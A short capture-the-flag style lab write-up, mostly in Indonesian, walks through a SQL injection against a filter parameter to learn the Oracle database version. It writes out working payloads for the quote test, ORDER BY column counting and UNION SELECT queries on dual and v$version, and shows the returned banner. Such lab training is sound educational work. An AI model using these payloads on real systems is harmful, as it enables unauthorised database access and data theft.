##  Write-up: SQL injection attack, querying the database type and version on Oracle

### Langkah-langkah:

1. **Buka lab** → intercept request pakai **Burp**.
   Contoh request:

   ```
   GET /filter?category=Corporate HTTP/2
   ```
   <img width="927" height="67" alt="image" src="https://github.com/user-attachments/assets/6136623d-bb73-427f-af5d-8cfdedddbe9f" />


2. **Uji injection** dengan menambahkan tanda `'`:

   ```
   /filter?category=Corporate'
   <img width="267" height="82" alt="image" src="https://github.com/user-attachments/assets/4ce723b1-acda-456b-a71e-c6e92a1961b8" />

   ```

   → Hasilnya muncul **500 Internal Server Error**, artinya vulnerable.

3. **Cari jumlah kolom** dengan `ORDER BY`:

   ```
   /filter?category=Corporate' ORDER BY 1--
   /filter?category=Corporate' ORDER BY 2--
   ```

   → Saat `ORDER BY 2` berhasil, tapi `ORDER BY 3` error → jumlah kolom = **2**.

4. **Uji UNION SELECT** untuk lihat output di halaman:

   ```
   /filter?category=Corporate' UNION SELECT 'aaa','bbb' FROM dual--
   ```

   → Teks `aaa` atau `bbb` muncul di halaman → injection berhasil.

5. **Ambil versi database Oracle**:

   ```
   /filter?category=Corporate' UNION SELECT banner,null FROM v$version--
   ```

   → Halaman menampilkan:

   ```
   Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production ...
   ```

   → Sesuai hint lab.

 **Lab Solved**
